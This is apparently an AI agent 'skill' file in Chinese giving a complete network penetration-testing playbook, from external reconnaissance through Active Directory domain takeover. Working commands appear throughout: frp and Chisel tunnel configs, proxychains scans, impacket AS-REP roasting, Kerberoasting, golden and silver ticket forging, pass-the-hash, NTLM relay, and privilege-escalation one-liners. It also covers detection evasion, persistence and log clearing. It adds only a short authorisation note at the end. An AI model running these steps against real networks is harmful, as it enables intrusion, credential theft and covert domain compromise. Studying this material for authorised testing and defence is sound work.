---
name: network-penetration-testing
description: 网络渗透测试深度专业技能：内外网渗透全流程、AD域渗透与攻击链、隧道代理与横向移动、协议攻击与利用、从信息收集到域控接管完整攻击链
version: 2.0.0
---

# 网络渗透测试深度技能

## 概述

网络渗透是攻防对抗的核心战场。本技能系统化覆盖**外网打点→隧道代理→内网信息收集→横向移动→权限提升→域控接管→持久化**完整攻击链，涵盖AD域渗透、协议攻击、隧道代理等高级技术。

## 一、外网信息收集

### 1.1 攻击面映射
```
Layer 1: 域名/IP资产枚举
  → 子域名枚举（Amass/Subfinder/MassDNS）
  → C段扫描（Nmap/Masscan）
  → ASN/IP段归属查询

Layer 2: 端口与服务发现
  → 全端口扫描（Masscan + Nmap验证）
  → 服务指纹识别（Nmap -sV）
  → 非标准端口服务探测

Layer 3: Web应用指纹
  → 技术栈识别（Wappalyzer/BuiltWith）
  → CMS/OA/邮件系统识别
  → API端点发现

Layer 4: 社会工程学准备
  → 邮箱枚举（theHarvester/Hunter.io）
  → 组织架构分析（LinkedIn/企查查）
  → 招聘信息技术栈推断
```

### 1.2 外网打点常见入口
| 入口 | 漏洞类型 | 工具 |
|------|---------|------|
| Web应用 | SQLi/RCE/SSRF/FileUpload | Burp/sqlmap |
| VPN | 漏洞利用/弱口令 | CVE利用 |
| 邮件系统 | 钓鱼/Exchange RCE | GoPhish/CVE |
| RDP/VNC | 弱口令/BlueKeep | Hydra/CVE |
| SSH | 弱口令/密钥泄露 | Hydra/ssh-audit |
| OA系统 | 历史RCE漏洞 | 专用Exp |
| 远程桌面 | 向日葵/Todesk/AnyDesk | 默认密码 |

## 二、隧道与代理

### 2.1 隧道技术矩阵

| 技术 | 工具 | 场景 |
|------|------|------|
| SOCKS5代理 | frp/Chisel/rpivot | 通用TCP代理 |
| HTTP代理 | Neo-reGeorg/Tunna | Web Shell代理 |
| ICMP隧道 | ptunnel/icmpsh | 严格防火墙 |
| DNS隧道 | dnscat2/iodine | 仅DNS出口 |
| SSH隧道 | ssh -D/-L/-R | 有SSH访问 |
| 多级代理 | frpc→frps→proxychains | 多层内网 |
| WebSocket | Chisel over WSS | WAF穿透 |

### 2.2 隧道搭建流程
```bash
# frp（推荐，稳定高效）
# 服务端frps.ini
[common]
bind_port = 7000
token = password

# 客户端frpc.ini
[common]
server_addr = vps_ip
server_port = 7000
token = password
[socks5]
type = tcp
remote_port = 6000
plugin = socks5

# Chisel（单二进制，轻量）
# 服务端
chisel server --port 8080 --reverse
# 客户端
chisel client vps:8080 R:socks

# proxychains使用
# /etc/proxychains4.conf
socks5 127.0.0.1 6000
proxychains nmap -sT -Pn 10.0.0.0/24
```

### 2.3 防火墙穿透
```
- 端口复用：利用已开放的80/443端口做隧道
- 协议封装：将SOCKS封装在HTTP/WebSocket/DNS/ICMP中
- 域前置：利用CDN隐藏C2通信
- 时间策略：在业务高峰时段通信，降低检测概率
```

## 三、内网信息收集

### 3.1 内网探测
```bash
# 存活主机发现（通过代理）
proxychains nmap -sn 10.0.0.0/24
proxychains nmap -sn 172.16.0.0/16
proxychains nmap -sn 192.168.0.0/24

# 关键端口扫描
proxychains nmap -sT -Pn -p 22,80,443,445,88,389,636,1433,3306,3389,6379,8080 10.0.0.0/24

# 服务识别
proxychains nmap -sT -Pn -sV -p 88,389,445 10.0.0.1

# AD域识别（端口88=Kerberos, 389=LDAP, 445=SMB, 636=LDAPS）
# 域控通常是88端口+389端口的主机
```

### 3.2 内网关键服务

| 端口 | 服务 | 攻击方向 |
|------|------|---------|
| 88 | Kerberos | 票据攻击/ASREPRoast/Kerberoast |
| 389/636 | LDAP/LDAPS | 域信息枚举/LDAP注入 |
| 445 | SMB | SMB Relay/EternalBlue/共享枚举 |
| 135 | RPC | DCOM利用/端口映射 |
| 5985/5986 | WinRM | PowerShell Remoting |
| 3389 | RDP | BlueKeep/RDP Hijack |
| 1433 | MSSQL | xp_cmdshell/链接服务器 |
| 6379 | Redis | 未授权/主从复制RCE |
| 27017 | MongoDB | 未授权访问 |
| 8443 | K8s API | 未授权/K8s渗透 |

## 四、Active Directory域渗透

### 4.1 AD攻击链

```
Phase 1: 域信息收集
  → 枚举域控/域用户/域组/SPN
  → BloodHound采集攻击路径

Phase 2: 凭据获取
  → AS-REP Roasting（无需密码的用户）
  → Kerberoasting（SPN关联账户）
  → LLMNR/NBT-NS投毒（Responder）
  → SMB Relay攻击
  → 内存提取（mimikatz/Procdump）
  → DCSync（复制域控数据库）

Phase 3: 横向移动
  → PTH（Pass The Hash）
  → PTT（Pass The Ticket）
  → WMI远程执行
  → WinRM远程执行
  → PsExec/SC服务创建
  → DCOM远程执行

Phase 4: 权限提升
  → 本地提权（CVE/Token/Service）
  → 域提权（Kerberos攻击/ACL滥用/GPO滥用）

Phase 5: 域控接管
  → DCSync → 获取krbtgt Hash
  → 制作黄金票据（Golden Ticket）
  → 制作白银票据（Silver Ticket）
  → Skeleton Key攻击
```

### 4.2 Kerberos攻击详解

```bash
# AS-REP Roasting（不需要域密码）
impacket-GetNPUsers domain/ -usersfile users.txt -outputfile hashes.txt
hashcat -m 18200 hashes.txt wordlist.txt

# Kerberoasting（SPN关联账户）
impacket-GetUserSPNs domain/user:password -outputfile spn_hashes.txt
hashcat -m 13100 spn_hashes.txt wordlist.txt

# 黄金票据（需要krbtgt Hash）
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@dc.domain.local

# 白银票据（需要目标服务Hash）
impacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-xxx -domain domain.local -spn cifs/dc.domain.local user
```

### 4.3 横向移动技术

```bash
# PTH（Pass The Hash）
proxychains impacket-psexec -hashes :NT_HASH domain/user@target

# WMI远程执行
proxychains impacket-wmiexec domain/user:password@target

# WinRM
proxychains evil-winrm -i target -u user -p password

# SMB Relay（NTLM Relay）
ntlmrelayx.py -t smb://target -smb2support

# DCOM远程执行
proxychains impacket-dcomexec domain/user:password@target
```

## 五、权限提升

### 5.1 Windows提权
```
信息收集：systeminfo / whoami /all / net user
漏洞利用：WinPEAS / Watson / PowerUp
服务滥用：不安全服务权限 / 未引用服务路径
注册表：AlwaysInstallElevated / AutoRun
Token操纵：SeImpersonatePrivilege（Potato系列）
计划任务：高权限计划任务劫持
凭据提取：SAM / LSA / DPAPI / 浏览器密码
```

### 5.2 Linux提权
```
信息收集：uname -a / id / sudo -l / find SUID
内核漏洞：CVE利用（DirtyPipe/DirtyCow/PwnKit）
SUID/SGID：find / -perm -4000
Cron作业：/etc/crontab / 用户crontab
Capabilities：getcap -r /
Sudo滥用：sudo -l → GTFOBins
Docker组：docker run -v /:/mnt alpine chroot /mnt
环境变量：LD_PRELOAD劫持
```

## 六、工具链

```bash
# 信息收集
nmap/masscan        # 端口扫描
Amass/Subfinder     # 子域名
theHarvester        # OSINT

# 渗透框架
Metasploit          # 漏洞利用框架
Cobalt Strike       # C2框架
Sliver              # 开源C2

# AD渗透
impacket            # AD攻击套件
BloodHound          # AD攻击路径
mimikatz            # Windows凭据提取
Rubeus              # Kerberos攻击
Responder           # LLMNR/NBT-NS投毒

# 隧道代理
frp/Chisel          # TCP隧道
Neo-reGeorg          # WebShell隧道
proxychains         # 代理链

# 提权
WinPEAS/LinPEAS     # 信息收集+提权建议
PowerUp             # Windows PowerShell提权
GTFOBins            # Linux二进制提权

# 横向移动
crackmapexec        # 内网渗透瑞士军刀
evil-winrm          # WinRM客户端
impacket            # 远程执行
```

## 七、测试检查清单

- [ ] 外网资产完整枚举
- [ ] 外网打点（Web/VPN/邮件/远程桌面）
- [ ] 隧道代理搭建（稳定+隐蔽）
- [ ] 内网信息收集（存活/端口/服务/域）
- [ ] AD域渗透（Kerberos/NTLM/LDAP）
- [ ] 凭据获取（内存/网络/磁盘）
- [ ] 横向移动（PTH/PTT/WMI/WinRM）
- [ ] 权限提升（Windows/Linux）
- [ ] 域控接管（DCSync/Golden Ticket）
- [ ] 持久化（后门/计划任务/服务）
- [ ] 痕迹清理（日志/临时文件/工具）

## 八、合规与注意事项

- **授权测试**：仅在授权范围内进行测试
- **最小影响**：优先使用无害PoC，避免破坏性操作
- **数据保护**：不导出/传播敏感数据
- **痕迹清理**：删除所有后门、工具、临时文件
- **报告提交**：提交完整渗透路径和修复建议
